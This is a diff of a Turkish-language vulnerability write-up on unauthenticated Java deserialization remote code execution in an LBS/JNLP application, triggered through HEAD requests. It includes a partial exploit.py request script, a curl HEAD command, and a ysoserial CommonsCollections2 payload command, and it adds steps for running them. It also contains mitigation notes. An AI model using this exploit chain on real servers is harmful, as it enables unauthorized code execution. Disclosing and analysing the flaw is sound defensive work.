@@ -13,9 +13,9 @@ Sınıflar: `com.lbs.start.JLbsStartup`, `com.lbs.start.SocketToken`
 
 Uygulama, JNLP dosyasında yer alan `DOCUMENT_URI` parametresini istemci sunucu akışında kullanıyor ve bu URI/uç nokta üzerinden dönen istek gövdesini HTTP metodu ne olursa olsun (HEAD dahil) okuyup `ObjectInputStream.readObject()` ile deserialize ediyor. Sonuç olarak saldırgan, kimlik doğrulaması olmadan bile **serialized** bir gövdeyi `HEAD` isteğiyle taşıyıp sunucu tarafında gadget zincirini tetikleyebiliyor ve RCE elde edebiliyor. Bu davranış, HTTP standardında HEAD yanıt gövdesinin olmamasıyla karıştırılabiliyor ancak **istek** gövdesi uygulama katmanında yanlış tasarımla okunuyorsa, HEAD de dahil olmak üzere metot agnostik bir akış ortaya çıkıyor ve deserialize zinciri aynı şekilde çalışıyor.
 
-Zincirin pratik akışı şöyle gerçekleşiyor: İstemci tarafından sunulan JNLP, `DOCUMENT_URI`’yi uygulama başlatma parametresi olarak içeriyor; bu parametre sunucu tarafındaki web bileşenine aktarılıyor ve burada ilgili handler/servlet, isteğin gövdesini **metot kontrolü yapmadan** `request.getInputStream()` ile tüketiyor. Ardından bu akış bir servis katmanına devredilip `new ObjectInputStream(in).readObject()` çağrısına ulaşıyor. Deserialize sırasında sınıf yükleme ve `readObject()`/`readResolve()` gibi giriş noktalarına bağlı bir **gadget zinciri** çalıştırılarak komut yürütme sağlanıyor. Bu nedenle saldırgan, `ysoserial` ile ürettiği bir `payload.ser` dosyasını `Content-Type: application/x-java-serialized-object` başlığıyla **HEAD** isteği gövdesine koyduğunda, uç nokta `POST`/`PUT` yerine `HEAD` ile çağrılsa bile, uygulamanın **metot-agnostik gövde okuması** yüzünden içerik deserialize edilip komut çalıştırılabiliyor. 
+Zincirin pratik akışı şöyle gerçekleşiyor: İstemci tarafından sunulan JNLP, `DOCUMENT_URI`’yi uygulama başlatma parametresi olarak içeriyor; bu parametre sunucu tarafındaki web bileşenine aktarılıyor ve burada ilgili handler/servlet, isteğin gövdesini **metot kontrolü yapmadan** `request.getInputStream()` ile tüketiyor. Ardından bu akış bir servis katmanına devredilip `new ObjectInputStream(in).readObject()` çağrısına ulaşıyor. Deserialize sırasında sınıf yükleme ve `readObject()`/`readResolve()` gibi giriş noktalarına bağlı bir **gadget zinciri** çalıştırılarak komut yürütme sağlanıyor. Bu nedenle saldırgan, `ysoserial` ile ürettiği bir `payload.ser` dosyasını `Content-Type: application/x-java-serialized-object` başlığıyla **HEAD** isteği gövdesine koyduğunda, uç nokta `POST`/`PUT` yerine `HEAD` ile çağrılsa bile, uygulamanın **metot-agnostik gövde okuması** yüzünden içerik deserialize edilip komut çalıştırılabiliyor.
 
- iki önemli belirti görüldü:
+iki önemli belirti görüldü:
 
 1. **Küçük** boyutta yapılan `HEAD` çağrıları `200 OK` döndürüp JNLP sunabiliyor, bu, uç noktanın HEAD’i işlediğini ve gövdeyi en azından kısmen tükettiğini gösteriyor.
 2. Tam teşekküllü serialized gövde ile `HEAD`/`POST` denemeleri bazı aşamalarda **RST by peer** ya da **405 Method Not Allowed** ile sonuçlanıyor. Bu, zafiyet raporlandıktan sonra devreye alınan WAF/konfig sertleştirmesinin (ör. belirli metotlara kısıtlama veya boyut/başlık tabanlı bloklama) etkisi olarak yorumlanıyor. Ancak burada yapılan sertleştirme **kök nedeni** (güvensiz deserialize akışı) kaldırmıyor; yalnızca belirli çağrı yollarını daraltıyor. Deserialize eden kod tabanda kaldığı sürece, farklı uçlar/parametreler veya farklı HTTP akışlarıyla yeniden tetiklenebilme riski devam ediyor.
@@ -90,9 +90,9 @@ JAR içindeki `com.lbs.start.SocketToken` / `new ServerSocket(port)` + `ObjectIn
 - Ayrıca `initListen(...)` içinde `ms_Instance.accept()` ile kabul edilen bağlantılarda yine `new ObjectInputStream(connection.getInputStream())` çağrısı ve `processor.processToken(message)` ile gelen nesnenin uygulama mantığına verildiği görülüyor.
 - Gelen veriye **hiçbir güvenlik filtresi uygulanmadan** `readObject()` çağrısı yapılmakta.\
   \
-  [exploit.py](http://exploit.py) // HEAD ile tetikleme
+  exploit.py // HEAD ile tetikleme
 
-```python
+```python exploit.py
 import requests
 
 url = "http://xx.xxx.xxx.xx:8080/xxxxxx/xxxxx/runapp?mem=2048&lang=TRTR&access_token=test123&tenantId=1&firmNr=001" ## Veriler Rastgeledir.
@@ -121,20 +121,13 @@ curl -v --http1.1 -X HEAD \
   'http://host:8080/xxxx/smart/runapp'
 ```
 
-```bash
+```bash Payload.ser
 java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
      --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
      --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
      --add-opens java.base/java.util=ALL-UNNAMED \
      -jar ysoserial-all.jar CommonsCollections2 "touch /tmp/pwned" > payload.ser
 ```
-
-<img
-  src="/images/Ekrangörüntüsü2025-11-01031514.png"
-  alt="Ekrangörüntüsü2025 11 01031514 Pn"
-  title="Ekrangörüntüsü2025 11 01031514 Pn"
-  style={{ width:"53%" }}
-/>
 
 **DOCUMENT_URI ne yapıyor?** JLbsStartup içinde JNLP parametresi `DOCUMENT_URI` okunup uygulama/applet’e `setDocumentURI(String)` ile aktarılıyor. Yani bu parametre, istemci tarafındaki ana bileşene “sunucuya hangi endpoint üzerinden bağlanacağını / doküman servisinin nerede olduğunu” bildiriyor. Dosyanın içinde bu akış net: satır ~**524**’te `getParameter("DOCUMENT_URI")` alınıyor, hemen ardından yansımayla `setDocumentURI(...)` çağrılıyor \
 `JLbsStartup.java` içinde tespit edilen bölüm:
@@ -156,11 +149,20 @@ JNLP’deki `DOCUMENT_URI`, istemci başlatılırken `JLbsStartup`**den** `setDo
 
 ## Kanıtın Gözlemi
 
-Pyhon komutu ile HEAD isteği başarı ile gönderildi.
+Payload.ser'i Yukarıda verdiğim şekilde CommonsCollections2 ile hazırla ve exploit.py yi çalıştır
+
+<img
+  src="/images/Ekrangörüntüsü2025-11-05014337.png"
+  alt="Ekrangörüntüsü2025 11 05014337 Pn"
+  title="Ekrangörüntüsü2025 11 05014337 Pn"
+  style={{ width:"65%" }}
+/>
+
+Pyhon komutu ile HEAD isteği başarı ile gönderildi, burda beklediğimiz çıktı HEAD isteği başarıyla gönderildi çıktısını alabilmek.
 
 ![Ekrangörüntüsü2025 11 03213652 Pn](/images/Ekrangörüntüsü2025-11-03213652.png)
 
-HEAD attığımızla birlikte python kodunda girdiğimiz link işlenmiş, oraya girdiğimiz şey her ne olursa olsun bir önemi yok, içeride bir deserialization işlem yapılma ihtimali eğer doğru yapılandırma yoksa apache tomcat ve Java WEB applerde çok yüksek ki sunucu PUT veya DELETE gibi HTTP methodlarına izin verdiği için bu işleme çok müsait bir ortam var. HEAD İsteği ile RCE standart gereği beklenmez, ancak yanlış/gevşek implementasyonlar nedeniyle mümkün oldu.
+HEAD attığımızla birlikte python kodunda girdiğimiz link işlenmiş, oraya girdiğimiz şey her ne olursa olsun bir önemi yok,.  PUT veya DELETE gibi HTTP methodlarına kimlik doğrulamasız izin verdiği için bu işleme çok müsait bir ortam var. HEAD İsteği ile RCE standart gereği beklenmez, ancak yanlış/gevşek implementasyonlar nedeniyle mümkün oldu.
 
 Sonuç olarak, `exploit.py`'yi çalıştırdığım zaman sunucuda tmp/pwned klasörü oluştuğunu görebiliriz.
 
@@ -189,7 +191,7 @@ Sonuç olarak, `exploit.py`'yi çalıştırdığım zaman sunucuda tmp/pwned kla
 
 - **Kimlik doğrulama:** Gerekmiyor.
 - **Ağ erişimi:** internet.
-- **Gadget zinciri:**`CommonsCollections2`   
+- **Gadget zinciri:**`CommonsCollections2`
 
 ## İstismar kolaylığı (Exploitability)
 
@@ -214,7 +216,7 @@ Sonuç olarak, `exploit.py`'yi çalıştırdığım zaman sunucuda tmp/pwned kla
 
 ## Kısıtlar  Çevresel faktörler
 
-- Sonradan eklenen **WAF**: Büyük/şüpheli gövde gönderiminde **RST **veya `405` döndürüyor; bu **semptomu gizler**, **kök nedeni kaldırmaz**.
+- Sonradan eklenen **WAF**: Büyük/şüpheli gövde gönderiminde \*\*RST \*\*veya `405` döndürüyor; bu **semptomu gizler**, **kök nedeni kaldırmaz**.
 - **Class-path farklılıkları**: Bazı sürümlerde belirli gadget’lar bulunmayabilir, ancak alternatif zincirler genelde mevcuttur.
 
 ### Mitigasyon
